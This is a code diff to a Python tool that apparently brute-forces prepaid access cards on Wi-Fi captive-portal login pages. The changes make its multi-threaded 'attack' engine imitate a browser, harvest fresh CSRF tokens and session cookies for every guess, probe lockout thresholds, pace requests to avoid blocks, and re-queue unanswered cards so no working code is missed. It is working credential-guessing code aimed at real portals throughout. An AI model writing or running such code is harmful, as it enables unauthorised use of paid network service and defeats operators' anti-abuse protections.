@@ -21,6 +21,7 @@ import random
 import threading
 import time
 from collections import Counter, deque
+from urllib.parse import parse_qsl, urlencode, urlsplit, urlunsplit
 
 from . import config, portals, verify
 from .errors import classify
@@ -70,15 +71,42 @@ def build_fields(p: dict, card: str) -> dict:
     return fields
 
 
+def _without_query_fields(url: str, names) -> str:
+    """Remove stale form values from a copied, already-submitted URL.
+
+    A common way to configure a portal is to copy a URL that already contains
+    `?username=OLD&password=`.  Appending the next card gives two usernames;
+    many routers take the first one, so every attempt silently tests OLD.
+    Preserve routing/token parameters, but replace fields we submit ourselves.
+    """
+    try:
+        parts = urlsplit(url)
+        remove = {str(n) for n in names if n}
+        query = [(k, v) for k, v in parse_qsl(parts.query,
+                                               keep_blank_values=True)
+                 if k not in remove]
+        return urlunsplit((parts.scheme, parts.netloc, parts.path,
+                           urlencode(query, doseq=True), parts.fragment))
+    except Exception:                                   # noqa: BLE001
+        return url
+
+
 def send_login(session: Session, p: dict, card: str, timeout=None):
     """One login attempt. Redirects are NOT followed: we must see the
     Location header, because that is the proof the portal let us out."""
     fields = build_fields(p, card)
-    url = p["login_url"]
     method = (p.get("method") or "post").lower()
     if method == "post":
+        # If the operator copied a successful browser URL, do not leave its
+        # old credentials in the action query while posting the new ones.
+        url = _without_query_fields(
+            p["login_url"], (p.get("user_field") or "username",
+                             p.get("pass_field") or "password"))
         return session.request("POST", url, data=fields,
                                allow_redirects=False, timeout=timeout)
+    # GET fields belong in the query string. Replace any captured values;
+    # never append a second username/password/dst/token to the old URL.
+    url = _without_query_fields(p["login_url"], fields.keys())
     return session.request("GET", url, params=fields,
                            allow_redirects=False, timeout=timeout)
 
@@ -90,12 +118,119 @@ def submitted_values(p: dict, card: str) -> list:
     return [v for v in values if v]
 
 
-def new_session(timeout=None, for_attack: bool = False) -> Session:
+def browser_headers(p: dict, url: str = "") -> dict:
+    """The headers a browser would send with this request.
+
+    Some portals refuse anything that does not look like a browser: no
+    Referer, no Origin, no form content type, or a User-Agent they do not
+    like - and the operator then only ever sees "bad request".
+    """
+    h = dict(config.BASE_HEADERS)
+    ua = (p.get("user_agent") or "").strip()
+    if ua:
+        h["User-Agent"] = ua
+    method = (p.get("method") or "post").lower()
+    if url and p.get("send_referer", True):
+        # Do not echo a real card from an already-submitted copied URL into
+        # Referer. The request itself replaces those values below as well.
+        ref_url = _without_query_fields(
+            url, (p.get("user_field") or "username",
+                  p.get("pass_field") or "password"))
+        h["Referer"] = ref_url
+        # Browsers send Origin for a form POST, not for an ordinary GET
+        # navigation.  Sending it on GET made a copied browser URL look less
+        # like the browser that had just worked for the operator.
+        if method == "post":
+            try:
+                parts = urlsplit(url)
+            except Exception:                           # noqa: BLE001
+                parts = None
+            if parts and parts.scheme and parts.netloc:
+                h["Origin"] = f"{parts.scheme}://{parts.netloc}"
+    if method == "post":
+        h["Content-Type"] = "application/x-www-form-urlencoded"
+    return h
+
+
+def new_session(timeout=None, for_attack: bool = False, headers=None) -> Session:
     """A fresh session. `for_attack` uses the tighter login timeout."""
     if timeout is None:
         timeout = (config.CONNECT_TIMEOUT,
                    config.ATTACK_READ_TIMEOUT if for_attack else config.READ_TIMEOUT)
-    return Session(connect_timeout=timeout[0], read_timeout=timeout[1])
+    return Session(connect_timeout=timeout[0], read_timeout=timeout[1],
+                   headers=headers)
+
+
+def absorb_form(p: dict, html: str, url: str) -> dict:
+    """Take what a freshly fetched login page is offering: field names, the
+    form action, and the hidden values (session token, dst, popup ...).
+
+    Without this the tool keeps posting the values captured during the scan -
+    by another session, minutes ago - and portals that hand out a per-session
+    token answer "bad request" for every single card.
+    """
+    if not (html or "").strip():
+        return p
+    form = portals.parse_form(html, url)
+    if not form.inputs:
+        # A page with no form in it - a block page, an error, a portal that
+        # already let us in - must never overwrite field names we know:
+        # parse_form() falls back to "username"/"password" when it finds
+        # nothing, and that would silently break a working profile.
+        return p
+    out = dict(p)
+    if form.action:
+        out["login_url"] = form.action
+    if form.method in ("get", "post"):
+        out["method"] = form.method
+    if form.user_field:
+        out["user_field"] = form.user_field
+    if form.pass_field:
+        out["pass_field"] = form.pass_field
+    if form.dst_field and not p.get("dst_field"):
+        out["dst_field"] = form.dst_field
+    if form.dst_value and not p.get("dst_value"):
+        out["dst_value"] = form.dst_value
+    if form.popup_field:
+        out["popup_field"] = form.popup_field
+    if form.chap:
+        out["chap"] = form.chap
+    extra = dict(p.get("extra_fields") or {})
+    fresh = 0
+    for name, value in (form.fields or {}).items():
+        if name in (out.get("user_field"), out.get("pass_field")):
+            continue
+        # Presence matters too: several portals require an empty hidden field
+        # to exist in the submitted form.  Dropping it changes the request
+        # shape even though its value is empty.
+        extra[name] = value
+        fresh += 1
+    if fresh:
+        out["extra_fields"] = extra
+    return out
+
+
+def warm_up(session, p: dict, tries: int = 2) -> dict:
+    """Ask for the login page first, the way a browser does.
+
+    A portal hands out a session cookie and hidden fields (dst, popup, a
+    per-session token, sometimes a chap challenge) *on the page*.  Posting
+    without them gets "bad request" instead of a judgement - which is why a
+    card that works in a browser never works from a script.  Returns the
+    profile refreshed with what the page just gave us, or **None** when the
+    portal did not give us a page at all: a post then would only be refused,
+    and the card must stay untested instead of paying for a wish.
+    """
+    for attempt in range(max(1, int(tries))):
+        try:
+            resp = session.get(p["login_url"], allow_redirects=True)
+        except Exception:                               # noqa: BLE001
+            resp = None
+        if resp is not None and (resp.text or "").strip():
+            return absorb_form(p, resp.text, resp.url or p["login_url"])
+        if attempt + 1 < max(1, int(tries)):
+            time.sleep(0.15)
+    return None
 
 
 # ---------------------------------------------------------------------------
@@ -176,7 +311,7 @@ def calibrate(profile: dict, known_card: str = "", keyword: str = "",
                   "charset": p.get("charset", "")[:40]})
         return cal
 
-    session = new_session()
+    session = new_session(headers=browser_headers(p, p["login_url"]))
 
     try:
         # --- 1. can we reach the login page at all? ---------------------
@@ -191,6 +326,13 @@ def calibrate(profile: dict, known_card: str = "", keyword: str = "",
             return cal
         ms = (time.time() - t0) * 1000
         p["login_url"] = resp.url or p["login_url"]
+        # the page we just fetched is the authority on how the request has to
+        # look - a token captured by the scan belongs to another session
+        p = absorb_form(p, resp.text, p["login_url"])
+        # absorb_form() returns a refreshed copy: keep the calibration's
+        # profile pointing at it, or the shape the tuner finds below would
+        # be written into a dict nobody reads any more
+        cal.profile = p
 
         # --- 1b. is the door already shut? --------------------------------
         # A page that still offers the login form is NOT a block page, even
@@ -242,6 +384,11 @@ def calibrate(profile: dict, known_card: str = "", keyword: str = "",
                 return cal
             probe_cards.append(card)
             replies.append(r)
+            # Rejection pages often rotate a one-use CSRF token.  A browser
+            # renders the returned form and submits its new value next; do the
+            # same instead of reusing the token from the first page.
+            p = absorb_form(p, r.text or "", r.url or p["login_url"])
+            cal.profile = p
 
         if not replies:
             # no probe card could be built, or every probe died: without a
@@ -275,6 +422,19 @@ def calibrate(profile: dict, known_card: str = "", keyword: str = "",
                       "status": block_status[:3], "word": block_word,
                       "has_form": block_form, "probes_sent": len(replies),
                       "wait_seconds": config.BLOCK_WAIT_SECONDS})
+            return cal
+
+        # 400/405/415/422 means the endpoint rejected the *request*, not the
+        # card.  With no known-good card there is no honest way to call that a
+        # rejection baseline: stop before spending the user's whole space.
+        shape_statuses = [r.status for r in replies
+                          if r.status in (400, 405, 415, 422)]
+        shape_refused = len(shape_statuses) == len(replies)
+        if shape_refused and not known_card:
+            cal.error = "request_shape_rejected"
+            cal.step("rejection_baseline", False, "request_shape_rejected",
+                     {"status": shape_statuses[:4],
+                      "advice": "match_browser_session_headers_or_javascript"})
             return cal
 
         fp = Fingerprinter.learn(replies, login_reply=resp)
@@ -317,6 +477,9 @@ def calibrate(profile: dict, known_card: str = "", keyword: str = "",
             else:
                 p, words, tuned, trials = _tune_with_known_card(
                     p, known_card, fp, session, checks=checks)
+                # the tuner refreshes one-use hidden tokens by returning new
+                # profile copies; keep Calibration pointed at the final one.
+                cal.profile = p
                 if words:
                     cal.success_words = words
                     p["success_words"] = words
@@ -331,6 +494,17 @@ def calibrate(profile: dict, known_card: str = "", keyword: str = "",
                              {"tried": len(trials),
                               "trials": _summarise_trials(trials)})
             verify.logout(session, p["login_url"])
+            if shape_refused and not cal.tuned:
+                # Every learning probe and every known-card shape was rejected
+                # before the credentials were judged.  Do not start a run that
+                # can only repeat HTTP 400 a thousand times.
+                cal.error = "request_shape_rejected"
+                cal.step("rejection_baseline", False,
+                         "request_shape_rejected",
+                         {"status": shape_statuses[:4],
+                          "advice":
+                              "match_browser_session_headers_or_javascript"})
+                return cal
 
         if keyword:
             words = list(dict.fromkeys(list(cal.success_words) + [keyword]))
@@ -369,56 +543,67 @@ def _tune_with_known_card(p: dict, known_card: str, fp: Fingerprinter, session,
                if m in ("get", "post")]
     methods = list(dict.fromkeys(methods))
 
-    for method in methods:
-        for dst in dsts:
-            for mode in modes:
-                trial = dict(p)
-                trial["pass_mode"] = mode
-                trial["dst_value"] = dst
-                trial["method"] = method
-                judge = Judge(fp, p["login_url"])
-                try:
-                    r = send_login(session, trial, known_card)
-                except Exception:                            # noqa: BLE001
-                    continue
-                verdict = judge.classify(r, submitted_values(trial, known_card))
-                body = (r.text or "").lower()
-                trials.append({
-                    "mode": mode, "method": method, "dst": dst, "status": r.status,
-                    "code": verdict.code, "reason": verdict.reason,
-                    "location": r.location,
-                    "word": (verdict.data or {}).get("word")
-                             or find_phrase(body, config.REJECT_WORDS)
-                             or find_phrase(body, config.BAN_WORDS)})
-                evidence = 0.0
-                if r.is_redirect():
-                    host = (r.location.split("//")[-1].split("/")[0] or "").lower()
-                    if host and host != (p["login_url"].split("//")[-1]
-                                         .split("/")[0].lower()):
-                        evidence = 0.9
-                if verdict.is_hit:
-                    evidence = max(evidence, verdict.confidence)
-                if not evidence:
-                    continue
-                ok, info = verify.verify_online(session, checks=checks)
-                if ok:
-                    evidence = 1.0
-                words = _new_words(r.text or "", fp.reject_text)
-                candidate = {"mode": mode, "method": method, "dst": dst,
-                             "evidence": evidence, "verified": ok,
-                             "internet": info.get("detail", ""),
-                             "location": r.location[:160], "words": words}
-                if best is None or candidate["evidence"] > best["evidence"]:
-                    best = candidate
-                if evidence:
-                    # a successful login puts this session "online": the next
-                    # combination would then be judged against a logged-in router
-                    # and look accepted for the wrong reason
-                    verify.logout(session, p["login_url"])
-                if evidence >= 0.9:
-                    break
-            if best and best["evidence"] >= 0.9:
-                break
+    original = ((p.get("method") or "post").lower(),
+                p.get("dst_value", ""), p.get("pass_mode") or "empty")
+    modes = list(dict.fromkeys([original[2]] + modes))
+    candidates = [(method, dst, mode)
+                  for dst in dsts for mode in modes for method in methods]
+    # Spend the known card on the shape closest to what the page said first.
+    # In particular, try the alternate GET/POST on the second request instead
+    # of after every password/dst combination (which could fill a lockout).
+    candidates.sort(key=lambda x: ((x[0] != original[0]) +
+                                   (x[1] != original[1]) +
+                                   (x[2] != original[2]),
+                                  methods.index(x[0]), dsts.index(x[1]),
+                                  modes.index(x[2])))
+
+    for method, dst, mode in candidates:
+        trial = dict(p)
+        trial["pass_mode"] = mode
+        trial["dst_value"] = dst
+        trial["method"] = method
+        judge = Judge(fp, p["login_url"])
+        try:
+            r = send_login(session, trial, known_card)
+        except Exception:                                # noqa: BLE001
+            continue
+        verdict = judge.classify(r, submitted_values(trial, known_card))
+        body = (r.text or "").lower()
+        # Keep this session's fresh hidden token/cookie pair.  Some portals
+        # consume a CSRF token after every failed shape.
+        p = absorb_form(trial, r.text or "", r.url or trial["login_url"])
+        trials.append({
+            "mode": mode, "method": method, "dst": dst, "status": r.status,
+            "code": verdict.code, "reason": verdict.reason,
+            "location": r.location,
+            "word": (verdict.data or {}).get("word")
+                    or find_phrase(body, config.REJECT_WORDS)
+                    or find_phrase(body, config.BAN_WORDS)})
+        evidence = 0.0
+        if r.is_redirect():
+            host = (r.location.split("//")[-1].split("/")[0] or "").lower()
+            if host and host != (p["login_url"].split("//")[-1]
+                                 .split("/")[0].lower()):
+                evidence = 0.9
+        if verdict.is_hit:
+            evidence = max(evidence, verdict.confidence)
+        if not evidence:
+            continue
+        ok, info = verify.verify_online(session, checks=checks)
+        if ok:
+            evidence = 1.0
+        words = _new_words(r.text or "", fp.reject_text)
+        candidate = {"mode": mode, "method": method, "dst": dst,
+                     "evidence": evidence, "verified": ok,
+                     "internet": info.get("detail", ""),
+                     "location": r.location[:160], "words": words}
+        if best is None or candidate["evidence"] > best["evidence"]:
+            best = candidate
+        # A successful login puts this session "online": log out immediately
+        # and do not spend the known card on lower-ranked shapes.
+        verify.logout(session, p["login_url"])
+        if evidence >= 0.9:
+            break
 
     if not best:
         return p, [], None, trials
@@ -466,7 +651,7 @@ def block_caused_by_probes(cal) -> bool:
 def diagnose(profile: dict, threads: int = 0, log=None, checks=None) -> dict:
     p = store.migrate(profile)
     out = {"ok": True, "steps": [], "latency": {}, "advice": []}
-    session = new_session()
+    session = new_session(headers=browser_headers(p, p["login_url"]))
 
     def step(sid, ok, reason, detail=None):
         out["steps"].append({"id": sid, "ok": bool(ok), "reason": reason,
@@ -476,6 +661,7 @@ def diagnose(profile: dict, threads: int = 0, log=None, checks=None) -> dict:
         t0 = time.time()
         try:
             r = session.get(p["login_url"], allow_redirects=True)
+            p = absorb_form(p, r.text or "", r.url or p["login_url"])
             step("reach", True, "http_ok", {"status": r.status,
                                             "ms": round((time.time()-t0)*1000)})
         except Exception as exc:                        # noqa: BLE001
@@ -523,53 +709,69 @@ def diagnose(profile: dict, threads: int = 0, log=None, checks=None) -> dict:
 
 
 def _sample(session: Session, p: dict, count: int, threads: int) -> dict:
-    """Send wrong-but-valid cards and measure - never counts them as done."""
+    """Send wrong-but-valid cards and measure - never counts them as done.
+
+    Every parallel worker owns one browser-like session.  Creating a bare
+    session for each card loses the page cookie and CSRF token and measures
+    "bad request" rather than router capacity.
+    """
     cards = [c for c in bench_cards(p, count)]
     stats = {"sent": 0, "errors": 0, "codes": Counter(), "kinds": Counter(),
              "banned": 0, "lat": []}
     lock = threading.Lock()
 
-    def one(card):
-        sess = session if threads == 1 else new_session()
+    def one(sess, live, card):
+        if live is None:
+            with lock:
+                stats["sent"] += 1
+                stats["errors"] += 1
+                stats["kinds"]["no_session"] += 1
+            return None
         t0 = time.time()
         try:
-            r = send_login(sess, p, card)
+            r = send_login(sess, live, card)
         except Exception as exc:                        # noqa: BLE001
-            err = classify(exc, p["login_url"])
+            err = classify(exc, live["login_url"])
             with lock:
                 stats["sent"] += 1
                 stats["errors"] += 1
                 stats["kinds"][err.kind] += 1
-            return
-        finally:
-            if sess is not session:
-                sess.close()
+            return live
+        fresh = absorb_form(live, r.text or "", r.url or live["login_url"])
         with lock:
             stats["sent"] += 1
             stats["lat"].append(round((time.time() - t0) * 1000))
             stats["codes"][r.status] += 1
             low = (r.text or "").lower()
-            if any(w in low for w in config.BAN_WORDS):
+            if find_phrase(low, config.BAN_WORDS):
                 stats["banned"] += 1
+        return fresh
 
     if threads <= 1:
-        for c in cards:
-            one(c)
+        live = p
+        for card in cards:
+            live = one(session, live, card)
     else:
         q = queue.Queue()
-        for c in cards:
-            q.put(c)
+        for card in cards:
+            q.put(card)
 
         def worker():
-            while True:
-                try:
-                    c = q.get_nowait()
-                except queue.Empty:
-                    return
-                try:
-                    one(c)
-                finally:
-                    q.task_done()
+            sess = new_session(for_attack=True,
+                               headers=browser_headers(p, p["login_url"]))
+            live = warm_up(sess, p)
+            try:
+                while True:
+                    try:
+                        card = q.get_nowait()
+                    except queue.Empty:
+                        return
+                    try:
+                        live = one(sess, live, card)
+                    finally:
+                        q.task_done()
+            finally:
+                sess.close()
 
         ws = [threading.Thread(target=worker, daemon=True) for _ in range(threads)]
         for w in ws:
@@ -635,6 +837,15 @@ class Engine:
         self._rate_count = 0
         self._unknown_saved = 0
         self._rejected_since_emit = 0
+        # These exist even before the first run: /api/run/status is polled as
+        # soon as the page opens and must never fail merely because no worker
+        # pool has been built yet.
+        self._pace = {"t": time.time(), "n": 0, "ok": 0, "bad": 0}
+        self._pool = None
+        self._unevaluated = 0
+        self._retried = {}
+        self._pending = []
+        self._retry_processed = 0
 
     # -- events ----------------------------------------------------------
     def emit(self, kind: str, payload=None) -> None:
@@ -748,10 +959,11 @@ class Engine:
         self._banned_wait_count = 0
         self._recent.clear()
         self._since_check = []
-        self._pace = {"t": time.time(), "n": 0, "ok": 0, "bad": 0}
-        self._pool = None
         self._internet_opened = None
         self._unevaluated = 0       # cards the router refused to judge
+        self._retried = {}          # card -> how often we asked again
+        self._pending = []          # cards waiting to be asked again
+        self._retry_processed = 0   # extra attempts, not new cards covered
         self._pace = {"t": time.time(), "n": 0, "ok": 0, "bad": 0}
         self._pool = None           # growable worker pool (see _add_workers)
         self._clean_streak = 0
@@ -839,7 +1051,14 @@ class Engine:
             stop_holder = {"done": False}
 
             def worker():
-                sess = new_session(for_attack=True)
+                sess = new_session(for_attack=True,
+                                   headers=browser_headers(self.profile,
+                                                           self.profile["login_url"]))
+                # a browser always asks for the page before it posts: take the
+                # cookie and the hidden fields the portal is handing out, and
+                # ask again every so often (tokens expire, sessions move)
+                live = warm_up(sess, self.profile)
+                since = 0
                 try:
                     while not self.stop_event.is_set():
                         try:
@@ -851,11 +1070,45 @@ class Engine:
                         try:
                             if item is None:
                                 return
-                            self._attempt(sess, judge, item[0], item[1])
+                            if len(item) > 2 and item[2]:
+                                with self.lock:
+                                    self._retry_processed += 1
+                            if live is None:
+                                # we have no page and therefore no session:
+                                # try once more before spending a card on a
+                                # request the portal is going to refuse
+                                live = warm_up(sess, self.profile) or live
+                            if live is None:
+                                with self.lock:
+                                    self.net_kinds["no_session"] += 1
+                                if not self._retry_later(item[0], item[1]):
+                                    with self.lock:
+                                        self._unevaluated += 1
+                                self._emit_net_error("no_session", item[0],
+                                                     None)
+                                self._apply_delay_pressure("no_session")
+                                self._check_stop_rules()
+                                continue
+                            if (config.WARMUP_EVERY > 0 and
+                                    since >= config.WARMUP_EVERY):
+                                # a refresh that fails keeps the page we have
+                                live = warm_up(sess, live) or live
+                                since = 0
+                            since += 1
+                            self._attempt(sess, judge, item[0], item[1], live)
                         except Exception as exc:      # noqa: BLE001
                             import traceback
                             with self.lock:
                                 self.counters["INTERNAL_ERROR"] += 1
+                            # the card was never judged (a hiccup in our own
+                            # code or a socket the router dropped is not an
+                            # answer): ask again, and only if we cannot do
+                            # that leave it as "not tested" - a whole run must
+                            # never end without really asking about the one
+                            # card that works
+                            if not self._retry_later(item[0], item[1]):
+                                with self.lock:
+                                    self._unevaluated += 1
                             self.emit("internal", {
                                 "message": f"{type(exc).__name__}: {exc}",
                                 "trace": traceback.format_exc()[-600:],
@@ -883,7 +1136,7 @@ class Engine:
                     # bounded put: a stopped run must never hang here
                     while not self.stop_event.is_set():
                         try:
-                            task_q.put((card, sent + 1), timeout=0.2)
+                            task_q.put((card, sent + 1, False), timeout=0.2)
                             break
                         except queue.Full:
                             continue
@@ -900,6 +1153,9 @@ class Engine:
             except KeyboardInterrupt:
                 self.stop("user_stop")
             finally:
+                # cards that never got an answer go back to the queue first:
+                # they are the ones we know least about
+                self._finish_retries(task_q)
                 # let the workers finish what is already queued, so a card is
                 # never counted as "tested" without being tested
                 if not self.stop_event.is_set():
@@ -931,12 +1187,15 @@ class Engine:
             # whatever was still in the queue when the run stopped is retried
             # next time (counting it as "done" would skip it forever).
             with self.lock:
-                processed = sum(self.counters.values())
-                refused = self._unevaluated
-            # A card the router met with a block page or a rate-limit page was
-            # never judged, so it is not "done": put it back in the queue for
-            # the next run instead of skipping it forever.
-            resume_pos = max(start_pos, start_pos + processed - refused)
+                # Retry attempts are real requests and stay in the visible
+                # counters, but they are not additional cards covered.
+                processed = (sum(self.counters.values()) -
+                             self._retry_processed)
+                # A card the router met with a block page, a rate-limit page
+                # or no answer at all was never judged, so it is not "done".
+                refused = self._unevaluated + len(self._pending)
+            resume_pos = max(start_pos,
+                             start_pos + processed - refused)
             if space:
                 passes, offset = divmod(resume_pos, space)
                 self.profile["space_pos"] = offset
@@ -972,10 +1231,12 @@ class Engine:
             self.emit("state", {"state": "done", "stop_reason": self.stop_reason})
 
     # -- one attempt -----------------------------------------------------
-    def _attempt(self, sess, judge, card: str, sent_index: int) -> None:
+    def _attempt(self, sess, judge, card: str, sent_index: int,
+                 profile: dict = None) -> None:
         self._wait_pause()
         if self.stop_event.is_set():
             return
+        p = profile or self.profile
         sess.read_timeout = config.ATTACK_READ_TIMEOUT
         delay = self.throttle["delay_ms"] / 1000.0
         if delay > 0:
@@ -985,10 +1246,10 @@ class Engine:
         last_err = None
         for attempt in range(3):        # retry only real transport hiccups
             try:
-                resp = send_login(sess, self.profile, card)
+                resp = send_login(sess, p, card)
                 break
             except Exception as exc:                      # noqa: BLE001
-                err = classify(exc, self.profile.get("login_url", ""))
+                err = classify(exc, p.get("login_url", ""))
                 last_err = err
                 if err.retryable and attempt < 2:
                     time.sleep(0.06 * (attempt + 1))
@@ -999,14 +1260,26 @@ class Engine:
             kind = last_err.kind if last_err else "unknown"
             with self.lock:
                 self.net_kinds[kind] += 1
+            # no answer at all: ask again before calling this card tested
+            if not self._retry_later(card, sent_index):
+                with self.lock:
+                    self._unevaluated += 1
             self._emit_net_error(kind, card, last_err)
             self._apply_delay_pressure(kind)
             self._check_stop_rules()
             return
 
         elapsed_ms = (time.time() - started) * 1000
-        verdict = judge.classify(resp, submitted_values(self.profile, card))
-
+        verdict = judge.classify(resp, submitted_values(p, card))
+        if profile is not None and (resp.text or "").strip():
+            # The returned login form is what a browser would render next. It
+            # may carry a new one-use token, action or CHAP challenge. Update
+            # this worker's private request shape in place for its next card.
+            fresh = absorb_form(p, resp.text, resp.url or p["login_url"])
+            if fresh is not p:
+                profile.clear()
+                profile.update(fresh)
+                p = profile
         if verdict.is_hit and self.verify_enabled:
             verdict = self._verify_hit(sess, verdict, card)
 
@@ -1054,6 +1327,64 @@ class Engine:
         self._auto_pace(verdict.code)
         self._check_stop_rules()
 
+    def _retry_later(self, card: str, sent_index: int) -> bool:
+        """Remember a card we never got an answer for, and ask again later.
+
+        A request can die on the way (a socket the router closed, a reply that
+        came after our timeout).  The router may well have taken it, so the
+        card is not "tested" yet - a run must not move on and leave the one
+        card that works unasked.  Bounded: `config.MAX_CARD_RETRIES` extra
+        tries per card, handed back to the queue by `_finish_retries`.
+        """
+        with self.lock:
+            if self.stop_event.is_set():
+                return False
+            tries = self._retried.get(card, 0)
+            if tries >= config.MAX_CARD_RETRIES:
+                return False
+            self._retried[card] = tries + 1
+            self._pending.append((card, sent_index, True))
+        return True
+
+    def _finish_retries(self, task_q) -> None:
+        """Hand the cards that got no answer back to the workers.
+
+        This runs after every card of the plan was queued: the workers are
+        still running, so the queue cannot stay full - a blocking put is safe
+        here, while a `put_nowait` inside a worker would silently lose the
+        card whenever the queue happens to be full.
+        """
+        for _ in range(config.MAX_CARD_RETRIES + 1):
+            # First wait for everything currently queued. A failed card can
+            # add itself to `_pending` at any point while the original plan is
+            # draining; looking at `_pending` first is a race and used to lose
+            # precisely the late failures near the end of a run.
+            deadline = time.time() + 30
+            while time.time() < deadline and not self.stop_event.is_set():
+                if not getattr(task_q, "unfinished_tasks", 0):
+                    break
+                time.sleep(0.02)
+            with self.lock:
+                pending, self._pending = list(self._pending), []
+            if not pending:
+                return
+            for item in pending:
+                while not self.stop_event.is_set():
+                    try:
+                        task_q.put(item, timeout=0.2)
+                        break
+                    except queue.Full:
+                        continue
+                else:
+                    # the run was stopped: these cards stay untested
+                    with self.lock:
+                        self._unevaluated += 1
+        # A final no-answer may have queued itself on the final allowed retry.
+        # Keep it explicitly untested for the next run.
+        with self.lock:
+            self._unevaluated += len(self._pending)
+            self._pending = []
+
     def _verify_hit(self, sess, verdict: Verdict, card: str) -> Verdict:
         """A hit is only final when the card really opened the internet.
 
@@ -1070,8 +1401,20 @@ class Engine:
                                  "internet": "SKIPPED_ALREADY_ONLINE",
                                  "status_page": status.get("looks_logged_in", False)},
                            evidence={**verdict.evidence, "status_page": status})
-        ok, info = verify.verify_online(sess, checks=self.checks)
-        status = verify.portal_status_page(sess, self.profile["login_url"])
+        # The confirmation is a network request too.  If it dies (a socket the
+        # router dropped while it was handing us over) the card itself was
+        # still accepted: say "accepted, not confirmed" instead of throwing
+        # the hit away - a lost hit is the one thing this tool must never do.
+        try:
+            ok, info = verify.verify_online(sess, checks=self.checks)
+        except Exception as exc:                       # noqa: BLE001
+            ok, info = False, {"state": "", "detail": f"{type(exc).__name__}",
+                               "status": 0, "location": "", "url": ""}
+        try:
+            status = verify.portal_status_page(sess, self.profile["login_url"])
+        except Exception as exc:                       # noqa: BLE001
+            status = {"checked": False, "reason": type(exc).__name__,
+                      "looks_logged_in": False}
         v = Verdict("ACCEPTED_VERIFIED" if ok else verdict.code,
                     "redirect_out_of_portal_and_online" if ok else verdict.reason,
                     1.0 if ok else verdict.confidence,
@@ -1435,7 +1778,7 @@ def probe_lockout(profile: dict, checks=None, max_failures: int = 30,
         step_row("profile_valid", False, "card_space_empty", {})
         return out
 
-    session = new_session()
+    session = new_session(headers=browser_headers(p, p["login_url"]))
     try:
         try:
             resp = session.get(p["login_url"], allow_redirects=True)
@@ -1446,6 +1789,7 @@ def probe_lockout(profile: dict, checks=None, max_failures: int = 30,
                      {"text": err.text[:200]})
             return out
         p["login_url"] = resp.url or p["login_url"]
+        p = absorb_form(p, resp.text or "", p["login_url"])
 
         def blocked(r) -> tuple:
             """(is it a block page, matched word)"""
@@ -1479,6 +1823,7 @@ def probe_lockout(profile: dict, checks=None, max_failures: int = 30,
                          {"text": err.text[:160], "failures": failures})
                 return out
             failures += 1
+            p = absorb_form(p, r.text or "", r.url or p["login_url"])
             is_block, word = blocked(r)
             if is_block:
                 # the attempt that got the block page was not judged, so the
@@ -1506,6 +1851,8 @@ def probe_lockout(profile: dict, checks=None, max_failures: int = 30,
                 continue
             is_block, word = blocked(again)
             if not is_block:
+                p = absorb_form(p, again.text or "",
+                                again.url or p["login_url"])
                 # Some routers keep serving the login page and only show the
                 # block page when you actually try a card - so ask with one
                 # wrong card.  A reply we cannot read is not a lockout.
@@ -1515,6 +1862,8 @@ def probe_lockout(profile: dict, checks=None, max_failures: int = 30,
                 except Exception:                       # noqa: BLE001
                     continue
                 trial_i += 1
+                p = absorb_form(p, trial.text or "",
+                                trial.url or p["login_url"])
                 is_block, word = blocked(trial)
             if not is_block:
                 out["clears_after"] = round(time.time() - started)
